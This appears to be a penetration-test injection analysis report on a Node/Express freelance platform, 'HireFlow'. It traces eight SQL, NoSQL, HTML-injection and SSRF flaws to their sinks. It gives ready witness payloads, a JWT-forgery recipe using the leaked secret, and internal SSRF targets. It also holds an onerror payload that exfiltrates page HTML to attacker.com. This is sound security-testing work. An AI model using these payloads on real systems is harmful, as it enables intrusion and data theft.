# Injection Analysis Report (SQLi, NoSQLi, SSTI & SSRF)

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Eight high-confidence injection vulnerabilities were identified across SQL injection (2), NoSQL injection (2), SSTI/HTML injection (1), and SSRF (3) categories. Two SQL injection vulnerabilities are unauthenticated or reachable via a forgeable JWT secret. All externally exploitable findings have been passed to the exploitation phase via the machine-readable queue at `deliverables/injection_exploitation_queue.json`.
- **Purpose of this Document:** This report provides strategic context, dominant patterns, environmental intelligence, and a complete record of secure vs. vulnerable vectors for effective exploitation of the queued vulnerabilities. It is intended to be read alongside the JSON deliverable.

### Vulnerability Count Summary

| ID | Type | Endpoint | Auth Required | Confidence | Externally Exploitable |
|----|------|----------|---------------|------------|------------------------|
| INJ-VULN-01 | SQLi | `GET /api/users?search=` | None | High | Yes |
| INJ-VULN-02 | SQLi | `GET /api/admin/users?search=` | Admin (JWT forgeable) | High | Yes |
| INJ-VULN-03 | NoSQLi ($where) | `GET /api/gigs?tag_filter=` | None | Med | Yes |
| INJ-VULN-04 | NoSQLi (operator inject) | `GET /api/admin/reports/activity?usernames[]=` | Admin (JWT forgeable) | High | Yes |
| INJ-VULN-05 | SSTI (Puppeteer HTML) | `GET /api/contracts/:id/invoice` (second-order) | Any auth | High | Yes |
| INJ-VULN-06 | SSRF (full read) | `GET /api/integrations/import?url=` | Any auth | High | Yes |
| INJ-VULN-07 | SSRF (full POST) | `POST /api/webhooks/test` | Any auth | High | Yes |
| INJ-VULN-08 | SSRF (partial blocklist) | `POST /api/messages/conversations/:id/link-preview` | Any auth | High | Yes |

---

## 2. Dominant Vulnerability Patterns

### Pattern A — Raw SQL String Concatenation via `db.raw()` and `whereRaw()`
- **Description:** The application uses Knex.js as its query builder but repeatedly bypasses its parameterization support by constructing SQL strings with JavaScript template literals or `+` concatenation before passing them to `db.raw()` or `whereRaw()`. Once the string is built, the tainted data is already embedded in the SQL command text — no amount of downstream parameter binding can sanitize it.
- **Implication:** The attacker can break out of the `ILIKE '%…%'` value slot and inject arbitrary PostgreSQL syntax: boolean conditions, stacked queries, UNION projections, subqueries, and time-based functions (`pg_sleep`).
- **Representative:** INJ-VULN-01, INJ-VULN-02

### Pattern B — Manual JSON String Construction for MongoDB Queries
- **Description:** Instead of using Mongoose/MongoDB driver's native query object construction (where every key-value pair is safe), the admin activity report endpoint manually builds a JSON string by concatenating user-supplied array elements and then passes the result to `JSON.parse()`. This converts the attacker-controlled string into a live query object with arbitrary MongoDB operators.
- **Implication:** Any MongoDB operator (`$ne`, `$gt`, `$regex`, `$where`) can be injected into the query filter by breaking the array element quoting.
- **Representative:** INJ-VULN-04

### Pattern C — Hardcoded JWT Secret Enabling Admin-Level Access
- **Description:** The JWT signing secret is hardcoded as `'hireflow2024api'` in `src/config/index.js`. Any attacker who reads this value (leaked source, `/api/debug/info` endpoint, etc.) can forge tokens with any role — including `admin` or `superadmin` — making every "admin-only" vulnerability effectively public.
- **Implication:** INJ-VULN-02 and INJ-VULN-04 are labelled admin-only at the route level, but the forged-JWT attack path degrades them to unauthenticated severity.
- **Representative:** INJ-VULN-02, INJ-VULN-04

### Pattern D — Unsanitized User Data Interpolated into Puppeteer HTML Template
- **Description:** The invoice PDF generator (`src/utils/pdf.js`) builds an HTML page via JavaScript template literals, embedding database fields (`display_name`, `milestone.title`, `email`) verbatim without HTML entity encoding. Chromium is launched with `--no-sandbox --disable-setuid-sandbox` and renders this HTML. Because any authenticated user can set their `display_name` via `PUT /api/users/:id` with no content validation, this is a stored injection path.
- **Implication:** An attacker stores a crafted `display_name` (e.g., `<script>` or `<img onerror=…>`), then triggers invoice generation for any contract they participate in (or any contract, due to missing authorization on the invoice endpoint). JavaScript runs inside the Chromium process with sandbox disabled, enabling data exfiltration and SSRF from the Chromium context.
- **Representative:** INJ-VULN-05

### Pattern E — SSRF via Unrestricted Server-Side HTTP Fetches
- **Description:** Three separate endpoints accept a user-supplied URL and make outbound HTTP requests on the server's behalf. Sources 5 and 6 have zero URL validation beyond `new URL()` parsing. Source 7 applies a blocklist of only `localhost` and `127.0.0.1`, trivially bypassed with IPv6 (`::1`), decimal encoding, `0.0.0.0`, or private RFC-1918 ranges.
- **Implication:** Attackers can pivot to internal Docker services (PostgreSQL on 5432, MongoDB on 27017, Redis on 6379, MinIO on 9000/9001, MailHog on 8025) that are exposed inside the Docker network but not intended to be publicly accessible.
- **Representative:** INJ-VULN-06, INJ-VULN-07, INJ-VULN-08

---

## 3. Strategic Intelligence for Exploitation

### 3.1 Defensive Evasion (WAF / Filter Analysis)
- **No WAF detected** at the Express layer (port 3000). Nginx is present at port 80 but no WAF rules were identified during reconnaissance. All payloads should be tested against port 3000 directly.
- The only input filtering observed is:
  - `parseInt()` / `parseFloat()` casts applied to numeric parameters (safe — those slots are not injectable)
  - A `localhost` / `127.0.0.1` blocklist in the messaging link-preview endpoint (trivially bypassable)
  - No regex or blacklist defenses on any of the vulnerable string-search parameters
- **Recommendation:** Begin with the simplest payloads; no evasion encoding is required.

### 3.2 Error-Based Injection Potential
- The `/api/users?search=` endpoint returns a `500` JSON response (`{ "error": "Failed to fetch users" }`) on database errors, but the full PostgreSQL error is written to the server log — not to the HTTP response. Error-based extraction via the HTTP response alone is limited.
- The `/api/admin/users?search=` endpoint uses `next(err)` which passes errors to the Express error handler. Depending on whether `NODE_ENV=production` is set, stack traces may or may not be returned. Test `NODE_ENV` behavior first.
- **Recommendation:** Start with **boolean-based blind** and **time-based blind** (`pg_sleep`) techniques for both SQLi endpoints, then pivot to UNION if the column count can be determined.

### 3.3 Confirmed Database Technology
- **PostgreSQL 15** — confirmed via Knex.js config (`src/config/database.js`) and `ILIKE` operator usage.
- All SQL payloads must be PostgreSQL-specific. Use `pg_sleep(N)` for time-based detection, `::text` casts, and `$$dollar-quoted$$` strings for evasion.
- **MongoDB 7** — confirmed for gig browsing and activity logs. MongoDB 7 disables `$where` by default (requires `javascriptEnabled: true` in `mongod.conf`). Verify live exploitability of INJ-VULN-03 before investing resources.

### 3.4 JWT Forgery — Unlocking Admin Endpoints
- **Secret:** `hireflow2024api` (hardcoded in `src/config/index.js:29`)
- **Algorithm:** HS256 (standard jsonwebtoken default)
- **Payload to forge admin token:**
  ```json
  { "id": "any-uuid", "email": "attacker@x.com", "role": "admin", "walletBalance": 0 }
  ```
- Use `jwt.sign(payload, 'hireflow2024api', { expiresIn: '7d' })` or any JWT library.
- This forged token unlocks INJ-VULN-02 and INJ-VULN-04 without requiring a real admin account.

### 3.5 SSRF Internal Network Targets
The Docker Compose network exposes the following internal services reachable via SSRF:

| Service | Internal Host | Port | Notes |
|---------|--------------|------|-------|
| PostgreSQL | `postgres` | 5432 | No auth, no SSL |
| MongoDB | `mongodb` | 27017 | No auth, no TLS |
| Redis | `redis` | 6379 | No auth |
| MinIO S3 API | `minio` | 9000 | Anonymous read on buckets |
| MinIO Web UI | `minio` | 9001 | Admin interface |
| MailHog SMTP | `mailhog` | 1025 | Captures all outbound email |
| MailHog Web UI | `mailhog` | 8025 | Lists all captured emails |
| Express App | `app` | 3000 | Internal self-SSRF |

### 3.6 Second-Order Puppeteer Exploitation Setup
For INJ-VULN-05, the exploitation chain requires two steps:
1. **Store payload:** `PUT /api/users/:id` with `{ "display_name": "<img src=x onerror='YOUR_PAYLOAD'>" }` — any authenticated user.
2. **Trigger PDF:** `GET /api/contracts/:id/invoice` — any authenticated user (no ownership check on invoice endpoint per recon). The attacker must be a party to at least one contract, OR exploit the IDOR on the invoice endpoint (confirmed missing authorization check).

---

## 4. Detailed Vulnerability Source-to-Sink Traces

### INJ-VULN-01 — SQL Injection: Public User Search

**Source:** `req.query.search` — `GET /api/users?search=<payload>` (no authentication required)

**Data Flow:**
```
GET /api/users?search=PAYLOAD
  → users.routes.js:10  router.get('/', usersController.listUsers)  [no auth middleware]
  → users.controller.js:7  const { search } = req.query           [no validation]
  → users.controller.js:10  usersService.listUsers({ search, ... }) [passed untouched]
  → users.service.js:33  query += ` AND (display_name ILIKE '%${search}%' OR email ILIKE '%${search}%' OR username ILIKE '%${search}%')` [SINK — raw SQL concat]
  → users.service.js:37-38  db.raw(countQuery, [...params])         [executed — search embedded in string]
  → users.service.js:44  db.raw(query, params)                      [executed — search embedded in string]
```

**Sink:** `src/users/users.service.js:33` — `db.raw()` with template-literal-built SQL string
**Slot Type:** SQL-like
**Sanitization Observed:** None
**Concat Occurrences:** `users.service.js:33` — template literal concat before `db.raw()` call (the only concat; no prior sanitization)
**Verdict:** VULNERABLE
**Mismatch Reason:** Template literal directly embeds `search` into the SQL ILIKE clause. The `params` array used in the subsequent `db.raw(query, params)` call does NOT contain `search` — it contains only `limit` and `offset`. The tainted data is baked into the query string, not bound as a parameter.
**Witness Payload:** `' OR 1=1--`
**Confidence:** High

---

### INJ-VULN-02 — SQL Injection: Admin User Search

**Source:** `req.query.search` — `GET /api/admin/users?search=<payload>` (admin role required; forgeable via `'hireflow2024api'` JWT secret)

**Data Flow:**
```
GET /api/admin/users?search=PAYLOAD
  → admin.routes.js:15  router.get('/users', requireAdmin, adminController.getUsers)
  → admin.controller.js:16  const { search } = req.query           [no validation]
  → admin.controller.js:19  adminService.getUsers({ search, ... })  [passed untouched]
  → admin.service.js:66  query.whereRaw("display_name ILIKE '%" + search + "%' OR email ILIKE '%" + search + "%'") [SINK]
  → admin.service.js:70  query.clone().count('id as total').first() [first execution]
  → admin.service.js:79-82  query.orderBy().limit().offset()        [second execution]
```

**Sink:** `src/admin/admin.service.js:66` — Knex `whereRaw()` with string concatenation
**Slot Type:** SQL-like
**Sanitization Observed:** None
**Concat Occurrences:** `admin.service.js:66` — `+` concatenation directly into `whereRaw()` argument
**Verdict:** VULNERABLE
**Mismatch Reason:** `whereRaw()` receives a pre-built SQL string; the `search` value is concatenated with `+` operators inside the string literal, making it structurally identical to raw string interpolation. Knex has no opportunity to bind the value.
**Witness Payload:** `' OR pg_sleep(5)--`
**Confidence:** High

---

### INJ-VULN-03 — NoSQL Injection: Gig Tag Filter ($where)

**Source:** `req.query.tag_filter` — `GET /api/gigs?tag_filter=<payload>` (no authentication required)

**Data Flow:**
```
GET /api/gigs?tag_filter=PAYLOAD
  → gigs.routes.js:8  router.get('/', optionalAuth, ctrl.listGigs)
  → gigs.controller.js:10  gigService.search(req.query)            [full req.query passed]
  → gigs.service.js:19  const { ..., tag_filter, ... } = params    [destructured, no validation]
  → gigs.service.js:41-46  query.$where = `function() { var tags = this.tags || []; return ${tag_filter}; }` [SINK]
  → gigs.service.js:95-101  Gig.find(query)                         [MongoDB execution]
```

**Sink:** `src/gigs/gigs.service.js:41-46` — MongoDB `$where` operator with template literal
**Slot Type:** TEMPLATE-expression (JavaScript execution context)
**Sanitization Observed:** None
**Concat Occurrences:** `gigs.service.js:44` — template literal `${tag_filter}` inside `$where` JavaScript function body
**Verdict:** VULNERABLE (code is structurally injectable; runtime exploitability depends on whether MongoDB 7 has `$where` / `javascriptEnabled` enabled in this deployment)
**Mismatch Reason:** The `tag_filter` value is directly embedded into a JavaScript function string that MongoDB executes server-side. Any JavaScript expression is valid as the return value, enabling data exfiltration and operator manipulation.
**Witness Payload:** `true || (function(){return true;})()`
**Confidence:** Med (MongoDB 7 disables `$where` by default; verify `javascriptEnabled: true` in deployment config)

---

### INJ-VULN-04 — NoSQL Injection: Admin Activity Report (Operator Injection)

**Source:** `req.query.usernames` (comma-separated, split into array) — `GET /api/admin/reports/activity?usernames=<payload>` (admin role required; forgeable via JWT secret)

**Data Flow:**
```
GET /api/admin/reports/activity?usernames=alice,PAYLOAD
  → admin.routes.js:25  router.get('/reports/activity', requireAdmin, adminController.getActivityReport)
  → admin.controller.js:244  const { usernames } = req.query       [no validation]
  → admin.controller.js:251  usernames.split(',').map(u => u.trim()) [split only, no escaping]
  → admin.service.js:360  var userFilter = usernames.map(function(u) { return '"' + u + '"'; }).join(',') [wraps in quotes, no escaping]
  → admin.service.js:361  var query = '{ "metadata.username": { "$in": [' + userFilter + '] } }' [SINK — string concat]
  → admin.service.js:362  filter = JSON.parse(query)               [materializes as live query object]
  → admin.service.js:371  ActivityLog.find(filter)                 [MongoDB execution]
```

**Sink:** `src/admin/admin.service.js:361-362` — manual JSON string construction + `JSON.parse()`
**Slot Type:** DESERIALIZE-object (JSON string → live MongoDB query)
**Sanitization Observed:** None (quote-wrapping at line 360 does not prevent injection if the value itself contains `"` characters)
**Concat Occurrences:** `admin.service.js:360` — `'"' + u + '"'` (no escaping of internal `"` or JSON special chars); `admin.service.js:361` — array elements embedded into JSON string
**Verdict:** VULNERABLE
**Mismatch Reason:** A username value of `alice","$or":[{"metadata.username":{"$ne":null}}` breaks out of the `$in` array and injects arbitrary MongoDB operators into the query filter. The quote-wrapping provides no protection against embedded double-quote characters.
**Witness Payload:** `alice","metadata":{"$ne":null}},{"x":"a`
**Confidence:** High

---

### INJ-VULN-05 — SSTI/HTML Injection: Puppeteer PDF Invoice

**Source (stored):** `req.body.display_name` via `PUT /api/users/:id`; `req.body.title` (milestone) via `POST/PUT /api/contracts/:id/milestones`

**Data Flow:**
```
[Store phase]
PUT /api/users/:id  { display_name: "<img src=x onerror='PAYLOAD'>" }
  → users.service.js:111-134  updateProfile()  [no content validation, stores verbatim in DB]
  → PostgreSQL users.display_name = "<img src=x onerror='PAYLOAD'>"

[Trigger phase]
GET /api/contracts/:id/invoice
  → contracts.controller.js:222  contractsService.generateInvoice(contractId)
  → contracts.service.js:431-432  db('users').where({ id: contract.client_id }).first()  → client.display_name
  → contracts.service.js:442  invoiceData.clientName = client.display_name  [no escaping]
  → contracts.service.js:447  invoiceData.items[*].description = milestone.title [no escaping]
  → pdf.js:61  ${data.clientName} [SINK — template literal in HTML string]
  → pdf.js:74  ${item.description} [SINK — template literal in HTML string]
  → pdf.js:15-16  page.setContent(html, { waitUntil: 'networkidle0' }) [Chromium renders]
```

**Sink:** `src/utils/pdf.js:61,74` — template literals in HTML string; `pdf.js:15-16` — Puppeteer `page.setContent()` with `--no-sandbox`
**Slot Type:** TEMPLATE-expression
**Sanitization Observed:** None at any point in the chain (storage, retrieval, or template construction)
**Concat Occurrences:** `pdf.js:61` — `${data.clientName}` post-storage (no sanitization ever applied); `pdf.js:74` — `${item.description}`
**Verdict:** VULNERABLE
**Mismatch Reason:** HTML-unescaped user-controlled strings are embedded into a Chromium-rendered HTML page. With `--no-sandbox` and `--disable-setuid-sandbox`, injected JavaScript runs in a privileged Chromium context that can make network requests, read environment data, and interact with internal services.
**Witness Payload:** `<img src=x onerror="fetch('https://attacker.com/'+btoa(document.documentElement.innerHTML))">`
**Confidence:** High

---

### INJ-VULN-06 — SSRF: Integration Profile Import

**Source:** `req.query.url` — `GET /api/integrations/import?url=<payload>` (any authenticated user)

**Data Flow:**
```
GET /api/integrations/import?url=http://169.254.169.254/latest/meta-data/
  → webhook.routes.js:69  router.get('/integrations/import', authenticate, ...)
  → webhook.routes.js:71  const { url } = req.query
  → webhook.service.js:198  const parsed = new URL(url)            [parses only, no blocklist]
  → webhook.service.js:199  const transport = parsed.protocol === 'https:' ? https : http
  → webhook.service.js:202-213  transport.request({ hostname: parsed.hostname, path: ..., method: 'GET' })  [SINK]
  → webhook.service.js:218-230  parsed JSON response returned to client
```

**Sink:** `src/integrations/webhook.service.js:213` — `transport.request()` with attacker-controlled hostname
**Slot Type:** FILE-path (network resource)
**Sanitization Observed:** `new URL()` parse only — validates URL syntax but applies no blocklist, allowlist, or private IP restriction
**Concat Occurrences:** None (URL passed directly to transport options)
**Verdict:** VULNERABLE
**Mismatch Reason:** No restriction on destination hostname or IP range. Attacker can reach any internal Docker service (PostgreSQL, MongoDB, Redis, MinIO, MailHog) or cloud metadata endpoints. Response body is parsed as JSON and returned to the attacker.
**Witness Payload:** `http://169.254.169.254/latest/meta-data/` or `http://mailhog:8025/api/v2/messages`
**Confidence:** High

---

### INJ-VULN-07 — SSRF: Webhook Test Endpoint (POST)

**Source:** `req.body.url` — `POST /api/webhooks/test` (any authenticated user)

**Data Flow:**
```
POST /api/webhooks/test  { "url": "http://redis:6379/" }
  → webhook.routes.js:48  router.post('/webhooks/test', authenticate, ...)
  → webhook.routes.js:50  const { url } = req.body
  → webhook.service.js:149  const parsed = new URL(url)            [parses only, no blocklist]
  → webhook.service.js:150  const transport = parsed.protocol === 'https:' ? https : http
  → webhook.service.js:165  transport.request({ hostname: parsed.hostname, ..., method: 'POST' })  [SINK]
  → webhook.service.js:186  req.write(testPayload)                 [POST body sent]
  → webhook.service.js:169-173  status + response body returned to caller
```

**Sink:** `src/integrations/webhook.service.js:165` — `transport.request()` POST to attacker-controlled hostname
**Slot Type:** FILE-path (network resource)
**Sanitization Observed:** `new URL()` parse only — no blocklist, no private IP restriction
**Concat Occurrences:** None
**Verdict:** VULNERABLE
**Mismatch Reason:** Attacker-controlled URL used as POST target with no restrictions. Enables state-mutating requests to internal services (e.g., Redis `SET` commands, MinIO API calls, internal REST endpoints).
**Witness Payload:** `http://redis:6379/` or `http://minio:9000/avatars/`
**Confidence:** High

---

### INJ-VULN-08 — SSRF: Link Preview (Partial Blocklist Bypass)

**Source:** `req.body.url` — `POST /api/messages/conversations/:id/link-preview` (any authenticated user)

**Data Flow:**
```
POST /api/messages/conversations/:id/link-preview  { "url": "http://[::1]:8025/" }
  → messaging.routes.js:14  router.post('/:id/link-preview', authenticate, ...)
  → messaging.controller.js:125  var url = req.body.url
  → messaging.service.js:371  parsed = new URL(url)
  → messaging.service.js:377-379  if protocol not http/https → reject
  → messaging.service.js:382-384  if hostname === 'localhost' OR '127.0.0.1' → reject  [BYPASSABLE]
  → messaging.service.js:387  client.get(url, { timeout: 5000 }, ...)  [SINK]
  → messaging.service.js:400-409  extracted OG metadata returned to caller
```

**Sink:** `src/messaging/messaging.service.js:387` — `http.get()` / `https.get()` with attacker-controlled URL
**Slot Type:** FILE-path (network resource)
**Sanitization Observed:** Protocol check (http/https only — `messaging.service.js:377`); hostname blocklist for `localhost` and `127.0.0.1` only (`messaging.service.js:382`)
**Concat Occurrences:** None
**Verdict:** VULNERABLE
**Mismatch Reason:** The blocklist covers only two values; `[::1]`, `0.0.0.0`, `127.0.0.2`, any RFC-1918 address (10.x.x.x, 172.16-31.x.x, 192.168.x.x), and Docker service hostnames (e.g., `postgres`, `mongodb`) all bypass the check. DNS rebinding is also possible.
**Witness Payload:** `http://[::1]:8025/api/v2/messages` or `http://0.0.0.0:6379/`
**Confidence:** High

---

## 5. Vectors Analyzed and Confirmed Secure

These input vectors were traced end-to-end and confirmed to have robust, context-appropriate defenses. They are **low-priority** for further testing.

| **Source (Parameter/Key)** | **Endpoint / File Location** | **Defense Mechanism Implemented** | **Verdict** |
|---|---|---|---|
| `role` | `GET /api/users` | `users.service.js:26-28` — Knex `.where('role', ?)` parameterized binding | SAFE |
| `page`, `limit` | `GET /api/users`, `/api/admin/users` | `parseInt()` cast with fallback default before use in SQL | SAFE |
| `category`, `subcategory` | `GET /api/gigs` | Mongoose equality filter `query.category = category` — no operator injection path | SAFE |
| `tags` | `GET /api/gigs` | Split then `{ $in: tagList }` — MongoDB native array operator, values are strings | SAFE |
| `min_price`, `max_price` | `GET /api/gigs` | `parseInt()` cast before `$gte`/`$lte` operator assignment | SAFE |
| `min_rating` | `GET /api/gigs` | `parseFloat()` cast before `$gte` operator assignment | SAFE |
| `sort` | `GET /api/gigs` | Validated against a whitelist of 6 allowed sort values before MongoDB sort construction | SAFE |
| `q` (project search) | `GET /api/projects` | Knex `.where('col', 'ilike', \`%${q}%\`)` — three-argument form; Knex binds the value as `$1`, not raw SQL | SAFE |
| `email`, `password` | `POST /api/auth/login` | `auth.service.js` — Knex `.where('email', email)` parameterized; password compared via bcrypt | SAFE |
| `email`, `username`, `password` | `POST /api/auth/register` | Knex `.insert()` with object binding — all values parameterized | SAFE |
| `is_active` | `GET /api/admin/users` | Boolean coercion (`=== 'true'`) before Knex `.where('is_active', bool)` | SAFE |
| `role` (admin filter) | `GET /api/admin/users` | Knex `.where('role', role)` — parameterized equality check | SAFE |
| `start_date`, `end_date` | `GET /api/admin/reports/activity` | Passed to `new Date()` constructor; date object used in MongoDB `$gte`/`$lte` — not injected into query string | SAFE |
| `amount`, `user_id` | `POST /api/webhooks/payment` | Wallet update uses `db.raw('balance + ?', [amount])` — explicit parameterized bind | SAFE (numeric injection) |
| `walletBalance` | JWT payload | Read from JWT which is HMAC-signed — cannot be tampered without secret (though secret is weak) | SAFE (integrity protected) |

---

## 6. Analysis Constraints and Blind Spots

- **MongoDB 7 `$where` Restriction:** INJ-VULN-03 targets the MongoDB `$where` operator, which requires `javascriptEnabled: true` in `mongod.conf`. MongoDB 7 ships with this disabled by default. Live exploitability must be verified by checking the actual `mongod.conf` or attempting the injection against the live endpoint. If blocked, the code is structurally vulnerable but not immediately weaponizable.

- **Puppeteer Second-Order Chain Complexity:** INJ-VULN-05 requires two distinct HTTP interactions (store payload + trigger PDF). The attacker must also be a party to a contract, or exploit the missing authorization check on `GET /api/contracts/:id/invoice` independently. Testing this chain requires a registered user account.

- **SSRF Response Parsing:** INJ-VULN-06 (`importProfile`) attempts to `JSON.parse()` the response body. Non-JSON internal services (Redis, raw TCP protocols) will cause a parse error, masking the SSRF. Use HTTP-speaking services (MailHog web UI on 8025, MinIO on 9000/9001) as initial targets.

- **Stored Procedures / Database Functions:** No stored procedures were identified in the codebase. All queries are constructed at the application layer.

- **WebSocket Injection Paths:** The Socket.IO `userId` query parameter is used for room management only and was not found to feed any database queries directly. This remains a low-priority blind spot.

- **File Upload LFI:** Uploaded files (via milestone submission and messaging) are stored under `/uploads/` with directory listing enabled and no file type restriction. HTML and SVG files with embedded scripts can be uploaded. However, the upload path is fixed by Multer's `diskStorage` configuration and does not accept path traversal in the filename — no LFI/RFI path was identified.
